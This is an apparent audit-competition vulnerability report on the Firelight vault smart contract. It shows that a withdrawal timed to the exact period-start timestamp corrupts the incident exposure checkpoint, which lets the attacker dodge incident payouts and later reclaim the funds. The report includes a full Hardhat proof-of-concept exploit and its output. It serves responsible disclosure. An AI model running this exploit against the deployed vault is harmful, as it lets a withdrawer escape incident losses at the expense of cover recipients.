# 88651 sc high inclusive period start checkpoint lets an exact boundary withdrawal erase incident payout exposure and later reclaim the pending funds

**Submitted on Aug 14th 2026 at 11:00:45 UTC by @Zoobi for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #88651
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A normal user can request a delayed withdrawal in a block whose timestamp is exactly the start of a new Firelight period. This writes the post-withdrawal active balance at the period-start checkpoint. Later, the normal IncidentManager approval flow asks the vault to pay a valid incident loss. The vault includes the pending withdrawal in payable capital, but separately limits payment to the corrupted checkpoint.

## Vulnerability Details

### Intended accounting

A withdrawal request burns shares but does not immediately transfer the underlying tokens. FirelightVault moves the amount into a pending withdrawal bucket. The payout function intentionally includes that bucket when calculating assets exposed to an incident.

Moving assets from active accounting to an exposed pending bucket must not reduce the opening exposure for that period.

### Root cause

The issue comes from four operations being combined:

{% stepper %}
{% step %}

## `withdraw()` moves assets into the next withdrawal bucket

{% endstep %}

{% step %}

## `withdraw()` then logs the lower active-assets value

{% endstep %}

{% step %}

## The checkpoint is keyed by the current block timestamp

{% endstep %}

{% step %}

## `totalAssetsAt(periodStart)` uses an inclusive lookup and returns a checkpoint written at that exact timestamp

{% endstep %}
{% endstepper %}

The withdrawal path records the lower post-request value:

```solidity
(uint256 shares, uint256 _totalSupply, uint256 _totalAssets) =
    _previewTotals(assets, true, Math.Rounding.Ceil);

uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);

_logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
```

The requested assets stay in the vault and are placed in a future withdrawal bucket:

```solidity
uint256 period = currentPeriod() + 1;

withdrawAssets[period] += assets;
withdrawShares[period] += sharesWithdraw;
withdrawSharesOf[period][receiver] += sharesWithdraw;

pendingWithdrawAssets += assets;
```

The new active-assets checkpoint uses the transaction timestamp:

```solidity
uint48 ts = Time.timestamp();

if (isLogAssets) {
    _traceTotalAssets.push(ts, _totalAssets);
}
```

The historical lookup is inclusive. It returns the newest checkpoint whose key is less than or equal to the requested timestamp:

```solidity
function totalAssetsAt(uint48 timestamp) public view returns (uint256) {
    return _traceTotalAssets.upperLookupRecent(timestamp);
}
```

Finally, `payout()` recognizes the pending withdrawal as payable capital but applies the corrupted opening checkpoint as a separate cap:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);
uint256 currentActiveAssets = totalAssets();
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];

uint256 activePayableAmount =
    currentActiveAssets + capturePeriodWithdrawals + nextPeriodWithdrawals;

paidAmount = Math.min(
    amount,
    Math.min(assetsAtCapturePeriod, activePayableAmount)
);
```

This creates inconsistent accounting:

```
Pre-boundary exposure             E
Boundary withdrawal              W
Active assets after request       E - W
Exposed pending assets            W
Tokens still held by the vault    E
Stored period-start cap           E - W
```

For a valid loss `L` where `L` is at least `E`:

```
paidAmount = min(L, E - W, E) = E - W
shortfall  = W
```

If the only shareholder withdraws all assets at the boundary, `W` equals `E`. The period-start cap becomes zero even though all `E` assets remain inside the incident-exposed pending bucket.

### Complete attack sequence

{% stepper %}
{% step %}

## The attacker owns vault shares before the next period starts

{% endstep %}

{% step %}

## Valid cover allocation capacity already exists for the next period

{% endstep %}

{% step %}

## The attacker sends a normal `withdraw()` transaction for inclusion at the exact period-start timestamp

{% endstep %}

{% step %}

## The withdrawal burns shares and puts the assets into the new period’s exposed pending bucket

{% endstep %}

{% step %}

## The same transaction stores the lower active-assets value at the period-start key

{% endstep %}

{% step %}

## A legitimate incident is captured at any time in that period

{% endstep %}

{% step %}

## The curator creates and confirms the incident, adds losses that fit the existing allocation, and submits the assessment

{% endstep %}

{% step %}

## The assessment approver approves the assessment

{% endstep %}

{% step %}

## IncidentManager converts the approved loss to vault-asset units and calls `FirelightVault.payout()`

{% endstep %}

{% step %}

## The vault pays less than the valid loss, or zero, because of the corrupted opening cap

{% endstep %}

{% step %}

## The incident closes normally

{% endstep %}

{% step %}

## After the withdrawal delay, the attacker calls `claimWithdraw()` and receives the amount that survived the payout

{% endstep %}
{% endstepper %}

The PoC does not call `payout()` from an impersonated payout signer. It deploys the real IncidentManager, configures valid allocation capacity before the boundary, runs `createIncident()`, `confirmIncident()`, `addAssessmentLosses()`, `submitCurrentAssessment()`, and `approveCurrentAssessment()`, and lets IncidentManager call the vault.

## Impact Details

### Sole-holder case: complete vault-leg bypass

The strongest proof uses one shareholder:

| Value                      | Before boundary request | After request | After approved incident |
| -------------------------- | ----------------------: | ------------: | ----------------------: |
| Tokens held by vault       |            500,000 fXRP |  500,000 fXRP |            500,000 fXRP |
| Active assets              |            500,000 fXRP |        0 fXRP |                  0 fXRP |
| Exposed pending withdrawal |                  0 fXRP |  500,000 fXRP |            500,000 fXRP |
| Stored opening cap         |            500,000 fXRP |        0 fXRP |                  0 fXRP |
| IncidentManager request    |                       — |             — |            500,000 fXRP |
| Vault payment              |                       — |             — |                  0 fXRP |
| Later attacker claim       |                       — |             — |            500,000 fXRP |

IncidentManager accepts and closes the valid assessment. The vault receiver receives zero. Once the delay passes, the user receives the entire pending amount.

### Two-holder case: proportional surviving claim

The second proof starts with two deposits of 500,000 illustrative fXRP:

| Value                      | Before boundary request |  After request | After approved incident |
| -------------------------- | ----------------------: | -------------: | ----------------------: |
| Tokens held by vault       |          1,000,000 fXRP | 1,000,000 fXRP |            500,000 fXRP |
| Active assets              |          1,000,000 fXRP |   500,000 fXRP |            250,000 fXRP |
| Exposed pending withdrawal |                  0 fXRP |   500,000 fXRP |            250,000 fXRP |
| Stored opening cap         |          1,000,000 fXRP |   500,000 fXRP |            500,000 fXRP |
| IncidentManager request    |                       — |              — |          1,000,000 fXRP |
| Vault payment              |                       — |              — |            500,000 fXRP |
| Later attacker claim       |                       — |              — |            250,000 fXRP |

The receiver is underpaid by 500,000 fXRP. The proof then advances beyond the delay and shows the attacker actually receiving the surviving 250,000 fXRP.

The impact is not only an incorrect view value. It changes the token amount transferred by an approved incident and preserves a claim that the payout should have reduced.

## References

* [Affected FirelightVault source](https://github.com/firelight-protocol/firelight-core/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/FirelightVault.sol)
* [Affected Checkpoints source](https://github.com/firelight-protocol/firelight-core/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/lib/Checkpoints.sol)
* [IncidentManager payout path](https://github.com/firelight-protocol/firelight-core/blob/42f9ea5e43d88b35197b901acc2a8c24b314fa62/contracts/core/IncidentManager.sol)
* [Public Firelight Phase 1 vault proxy](https://flare-explorer.flare.network/address/0x4C18Ff3C89632c3Dd62E796c0aFA5c07c4c1B2b3)
* [Exact-boundary Flare block 67,313,847](https://flare-explorer.flare.network/block/67313847)
* [Flare network overview](https://dev.flare.network/network/overview)
* [Flare consensus](https://dev.flare.network/network/consensus)
* [Firelight withdrawal documentation](https://docs.firelight.finance/user-guides/withdraw-and-unstake/initiating-a-withdrawal)
* [Firelight event documentation](https://docs.firelight.finance/technical-documents/events)

## Proof of Concept

### Setup and run instructions

{% stepper %}
{% step %}

## Clone and install

```bash
git clone https://github.com/firelight-protocol/firelight-core.git
cd firelight-core
git checkout 42f9ea5e43d88b35197b901acc2a8c24b314fa62
npm install
```

{% endstep %}

{% step %}

## Save the test

Save the complete test below as `test/poc/c02_boundary_withdrawal.js`.
{% endstep %}

{% step %}

## Run the test

```bash
npx hardhat test test/poc/c02_boundary_withdrawal.js
```

If the repository is already compiled:

```bash
npx hardhat test --no-compile test/poc/c02_boundary_withdrawal.js
```

{% endstep %}
{% endstepper %}

### Complete PoC code

```javascript
const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");
const { deployVault } = require("../setup/fixtures.js");

const DECIMALS = 6n;
const DECIMAL_POW = 10n ** DECIMALS;
const INCIDENT_STATUS_CLOSED = 4n;

const assetUnits = (value) => ethers.parseUnits(value.toString(), 6);
const canonicalUnits = (value) => ethers.parseUnits(value.toString(), 18);

function fmtFull(value) {
  const n = BigInt(value);
  return `${n / DECIMAL_POW}.${(n % DECIMAL_POW).toString().padStart(Number(DECIMALS), "0")}`;
}

async function deployC02Fixture() {
  // These scaled balances and the 2,000,000 fXRP cap are illustrative test values.
  // They do not assert that a deployed Firelight vault currently has this cap or TVL.
  const ctx = await deployVault({
    decimals: 6n,
    initial_deposit_limit: assetUnits("2000000"),
  });

  const signers = await ethers.getSigners();
  const admin = signers[9];
  const curator = signers[10];
  const assessmentApprover = signers[11];
  const assessmentRejecter = signers[12];
  const incidentInvalidator = signers[13];
  const configAdmin = signers[14];
  const payoutAdmin = signers[15];
  const priceFeedAdmin = signers[16];
  const firstLossBufferPayer = signers[17];
  const payoutRecipient = signers[18];

  const MockERC20 = await ethers.getContractFactory("MockERC20");
  const firstLossBufferToken = await MockERC20.deploy("Mock USDC", "mUSDC", 6);

  const MockCoverOrderAllocator = await ethers.getContractFactory(
    "MockIncidentManagerCoverOrderAllocator",
  );
  const coverOrderAllocator = await MockCoverOrderAllocator.deploy();
  await coverOrderAllocator.setVault(ctx.firelight_vault.target);
  await coverOrderAllocator.setCanonicalDecimals(18);
  await coverOrderAllocator.setMockCapacityConfig({
    minCAR: 10000,
    firstLossBufferToken: firstLossBufferToken.target,
    firstLossBuffer: firstLossBufferPayer.address,
    effectiveLeverage: 20000,
    minOrderMarketCoverAmount: 1,
    divergenceToleranceBps: 0,
  });

  const MockPriceFeed = await ethers.getContractFactory("MockPriceFeed");
  const priceFeed = await MockPriceFeed.deploy(8, 10n ** 8n); // $1.00

  const IncidentManager = await ethers.getContractFactory("IncidentManager");
  const incidentManager = await upgrades.deployProxy(
    IncidentManager,
    [
      admin.address,
      curator.address,
      assessmentApprover.address,
      assessmentRejecter.address,
      incidentInvalidator.address,
      configAdmin.address,
      payoutAdmin.address,
      priceFeedAdmin.address,
      ctx.payout_receiver.address,
      coverOrderAllocator.target,
      priceFeed.target,
      3600,
    ],
    { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
  );

  await ctx.firelight_vault
    .connect(ctx.deployer)
    .grantRole(await ctx.firelight_vault.PAYOUT_ROLE(), incidentManager.target);
  await ctx.firelight_vault
    .connect(ctx.deployer)
    .grantRole(await ctx.firelight_vault.INCIDENT_ROLE(), incidentManager.target);

  return {
    ...ctx,
    admin,
    curator,
    assessmentApprover,
    firstLossBufferPayer,
    payoutRecipient,
    firstLossBufferToken,
    coverOrderAllocator,
    priceFeed,
    incidentManager,
  };
}

async function configureExistingAllocation(ctx, {
  coverTokenId,
  marketId,
  incidentPeriod,
  canonicalLoss,
}) {
  // Configure valid pre-existing allocation capacity before the boundary transaction.
  await ctx.coverOrderAllocator.setOrderMarket(
    coverTokenId,
    marketId,
    incidentPeriod,
    canonicalLoss,
    ctx.payoutRecipient.address,
  );
}

async function approveIncidentThroughManager(ctx, {
  coverTokenId,
  marketId,
  captureTimestamp,
  canonicalLoss,
  requestedAssetLoss,
  expectedPaidAmount,
  incidentRef,
}) {
  const incidentPeriod = await ctx.firelight_vault.periodAtTimestamp(captureTimestamp);
  const now = await time.latest();

  // Refresh the mock oracle after the one-period timestamp jump. The allocation
  // configured before the boundary is not changed during incident assessment.
  await ctx.priceFeed.setLatestRoundData(2, 10n ** 8n, now, now, 2);

  await ctx.incidentManager.connect(ctx.curator).createIncident(
    captureTimestamp,
    "Boundary checkpoint incident",
    incidentRef,
  );
  await ctx.incidentManager.connect(ctx.curator).confirmIncident(1, "ipfs://boundary-checkpoint-incident");
  await ctx.incidentManager.connect(ctx.curator).addAssessmentLosses(1, [
    { coverTokenId, marketId, amount: canonicalLoss },
  ]);
  await ctx.incidentManager.connect(ctx.curator).submitCurrentAssessment(1);

  const approval = ctx.incidentManager.connect(ctx.assessmentApprover).approveCurrentAssessment(1);
  await expect(approval)
    .to.emit(ctx.incidentManager, "IncidentPayoutExecuted")
    .withArgs(
      1,
      1,
      incidentPeriod,
      incidentPeriod,
      ctx.payout_receiver.address,
      ctx.firstLossBufferPayer.address,
      ctx.firstLossBufferToken.target,
      0,
      canonicalLoss,
      requestedAssetLoss,
      expectedPaidAmount,
    )
    .and.to.emit(ctx.firelight_vault, "PayoutExecuted")
    .withArgs(
      ctx.payout_receiver.address,
      requestedAssetLoss,
      expectedPaidAmount,
      captureTimestamp,
    );

  const [incident] = await ctx.incidentManager.getIncident(1);
  expect(incident.status).to.equal(INCIDENT_STATUS_CLOSED);
  expect(incident.vaultPaidAmount).to.equal(expectedPaidAmount);
}

async function advanceAndClaim(ctx, attacker, withdrawalPeriod, expectedClaim) {
  const duration = BigInt(ctx.config.period_configuration_duration);
  await time.increaseTo((await ctx.firelight_vault.currentPeriodEnd()) + duration);

  const balanceBefore = await ctx.token_contract.balanceOf(attacker.address);
  await expect(ctx.firelight_vault.connect(attacker).claimWithdraw(withdrawalPeriod))
    .to.emit(ctx.firelight_vault, "CompleteWithdraw")
    .withArgs(attacker.address, expectedClaim, withdrawalPeriod);
  const balanceAfter = await ctx.token_contract.balanceOf(attacker.address);

  expect(balanceAfter - balanceBefore).to.equal(expectedClaim);
  return balanceAfter - balanceBefore;
}

describe("C-02 | boundary withdrawal corrupts incident exposure cap", function () {
  it("uses the real IncidentManager path and lets the attacker claim the surviving 250,000 fXRP", async function () {
    const amount = assetUnits("500000");
    const totalExposure = amount * 2n;
    const canonicalLoss = canonicalUnits("1000000");
    const coverTokenId = 1n;
    const marketId = ethers.id("c02-two-depositor-market");

    const ctx = await loadFixture(deployC02Fixture);
    const attacker = ctx.users[0];
    const honestDepositor = ctx.users[1];
    const vault = ctx.firelight_vault;

    console.log("\n==========================================================");
    console.log("C-02A | Scaled two-depositor example (illustrative values)");
    console.log("==========================================================");
    console.log("The 1,000,000 fXRP exposure and 2,000,000 fXRP fixture cap are illustrative.");
    console.log("They do not claim that a deployed Firelight vault currently has those balances.");

    await ctx.utils.mintAndApprove(amount, attacker);
    await ctx.utils.mintAndApprove(amount, honestDepositor);
    await vault.connect(attacker).deposit(amount, attacker.address);
    await vault.connect(honestDepositor).deposit(amount, honestDepositor.address);

    const periodBoundary = await vault.currentPeriodEnd();
    const incidentPeriod = (await vault.currentPeriod()) + 1n;
    const withdrawalPeriod = incidentPeriod + 1n;

    await configureExistingAllocation(ctx, {
      coverTokenId,
      marketId,
      incidentPeriod,
      canonicalLoss,
    });

    console.log("[1] Existing valid allocation: 1,000,000 fXRP-equivalent for the next period");
    console.log(`[2] Pre-boundary exposure: ${fmtFull(await vault.totalAssetsAt(periodBoundary - 1n))} fXRP`);
    expect(await vault.totalAssetsAt(periodBoundary - 1n)).to.equal(totalExposure);

    await time.setNextBlockTimestamp(periodBoundary);
    await vault.connect(attacker).withdraw(amount, attacker.address, attacker.address);

    console.log(`[3] Exact-boundary withdrawal: ${fmtFull(amount)} fXRP`);
    console.log(`[4] Corrupted opening cap: ${fmtFull(await vault.totalAssetsAt(periodBoundary))} fXRP`);
    console.log(`[5] Pending exposed capital: ${fmtFull(await vault.withdrawAssets(withdrawalPeriod))} fXRP`);
    expect(await vault.currentPeriodStart()).to.equal(periodBoundary);
    expect(await vault.totalAssetsAt(periodBoundary)).to.equal(amount);
    expect(await vault.withdrawAssets(withdrawalPeriod)).to.equal(amount);

    await approveIncidentThroughManager(ctx, {
      coverTokenId,
      marketId,
      captureTimestamp: periodBoundary,
      canonicalLoss,
      requestedAssetLoss: totalExposure,
      expectedPaidAmount: amount,
      incidentRef: ethers.id("c02-two-depositor-incident"),
    });

    const survivingWithdrawal = amount / 2n;
    console.log(`[6] IncidentManager requested: ${fmtFull(totalExposure)} fXRP`);
    console.log(`[7] Vault paid receiver: ${fmtFull(await ctx.token_contract.balanceOf(ctx.payout_receiver.address))} fXRP`);
    console.log(`[8] Surviving attacker bucket: ${fmtFull(await vault.withdrawAssets(withdrawalPeriod))} fXRP`);
    expect(await ctx.token_contract.balanceOf(ctx.payout_receiver.address)).to.equal(amount);
    expect(await vault.totalAssets()).to.equal(amount / 2n);
    expect(await vault.withdrawAssets(withdrawalPeriod)).to.equal(survivingWithdrawal);

    const claimed = await advanceAndClaim(ctx, attacker, withdrawalPeriod, survivingWithdrawal);
    console.log(`[9] Attacker claims after the delay: ${fmtFull(claimed)} fXRP`);
    console.log("Result: a 1,000,000 fXRP approved loss is underpaid by 500,000 fXRP,");
    console.log("and the attacker actually receives the surviving 250,000 fXRP.");
    console.log("==========================================================\n");
  });

  it("reduces a sole withdrawer's incident payout to zero while all 500,000 fXRP remains pending", async function () {
    const exposure = assetUnits("500000");
    const canonicalLoss = canonicalUnits("500000");
    const coverTokenId = 2n;
    const marketId = ethers.id("c02-sole-withdrawer-market");

    const ctx = await loadFixture(deployC02Fixture);
    const attacker = ctx.users[0];
    const vault = ctx.firelight_vault;

    console.log("\n==========================================================");
    console.log("C-02B | Sole withdrawer produces a zero incident payout");
    console.log("==========================================================");
    console.log("The 500,000 fXRP balance is an illustrative fixture value.");

    await ctx.utils.mintAndApprove(exposure, attacker);
    await vault.connect(attacker).deposit(exposure, attacker.address);

    const periodBoundary = await vault.currentPeriodEnd();
    const incidentPeriod = (await vault.currentPeriod()) + 1n;
    const withdrawalPeriod = incidentPeriod + 1n;

    await configureExistingAllocation(ctx, {
      coverTokenId,
      marketId,
      incidentPeriod,
      canonicalLoss,
    });

    expect(await vault.totalAssetsAt(periodBoundary - 1n)).to.equal(exposure);
    await time.setNextBlockTimestamp(periodBoundary);
    await vault.connect(attacker).withdraw(exposure, attacker.address, attacker.address);

    console.log(`[1] Pre-boundary active exposure: ${fmtFull(exposure)} fXRP`);
    console.log(`[2] Post-request tokens still held by vault: ${fmtFull(await ctx.token_contract.balanceOf(vault.target))} fXRP`);
    console.log(`[3] Incident-exposed pending bucket: ${fmtFull(await vault.withdrawAssets(withdrawalPeriod))} fXRP`);
    console.log(`[4] Corrupted period-start cap: ${fmtFull(await vault.totalAssetsAt(periodBoundary))} fXRP`);
    expect(await ctx.token_contract.balanceOf(vault.target)).to.equal(exposure);
    expect(await vault.withdrawAssets(withdrawalPeriod)).to.equal(exposure);
    expect(await vault.totalAssetsAt(periodBoundary)).to.equal(0);

    await approveIncidentThroughManager(ctx, {
      coverTokenId,
      marketId,
      captureTimestamp: periodBoundary,
      canonicalLoss,
      requestedAssetLoss: exposure,
      expectedPaidAmount: 0n,
      incidentRef: ethers.id("c02-sole-withdrawer-incident"),
    });

    console.log(`[5] IncidentManager requested: ${fmtFull(exposure)} fXRP`);
    console.log(`[6] Receiver obtained: ${fmtFull(await ctx.token_contract.balanceOf(ctx.payout_receiver.address))} fXRP`);
    console.log(`[7] Pending exposed capital after payout: ${fmtFull(await vault.withdrawAssets(withdrawalPeriod))} fXRP`);
    expect(await ctx.token_contract.balanceOf(ctx.payout_receiver.address)).to.equal(0);
    expect(await vault.withdrawAssets(withdrawalPeriod)).to.equal(exposure);

    const claimed = await advanceAndClaim(ctx, attacker, withdrawalPeriod, exposure);
    console.log(`[8] Attacker later claims: ${fmtFull(claimed)} fXRP`);
    console.log("Result: the authorized incident closes with a zero vault payment even though");
    console.log("500,000 fXRP remained in the incident-exposed pending bucket, and the attacker later receives it all.");
    console.log("==========================================================\n");
  });
});
```

### Observed output

```
C-02 | boundary withdrawal corrupts incident exposure cap

C-02A | Scaled two-depositor example (illustrative values)
The 1,000,000 fXRP exposure and 2,000,000 fXRP fixture cap are illustrative.
[1] Existing valid allocation: 1,000,000 fXRP-equivalent for the next period
[2] Pre-boundary exposure: 1000000.000000 fXRP
[3] Exact-boundary withdrawal: 500000.000000 fXRP
[4] Corrupted opening cap: 500000.000000 fXRP
[5] Pending exposed capital: 500000.000000 fXRP
[6] IncidentManager requested: 1000000.000000 fXRP
[7] Vault paid receiver: 500000.000000 fXRP
[8] Surviving attacker bucket: 250000.000000 fXRP
[9] Attacker claims after the delay: 250000.000000 fXRP
Result: approved loss underpaid by 500,000 fXRP; attacker receives 250,000 fXRP.
  ✔ uses the real IncidentManager path and lets the attacker claim the surviving 250,000 fXRP

C-02B | Sole withdrawer produces a zero incident payout
[1] Pre-boundary active exposure: 500000.000000 fXRP
[2] Post-request tokens still held by vault: 500000.000000 fXRP
[3] Incident-exposed pending bucket: 500000.000000 fXRP
[4] Corrupted period-start cap: 0.000000 fXRP
[5] IncidentManager requested: 500000.000000 fXRP
[6] Receiver obtained: 0.000000 fXRP
[7] Pending exposed capital after payout: 500000.000000 fXRP
[8] Attacker later claims: 500000.000000 fXRP
Result: incident closes with zero vault payment; attacker later receives all pending funds.
  ✔ reduces a sole withdrawer's incident payout to zero while all 500,000 fXRP remains pending

2 passing
```
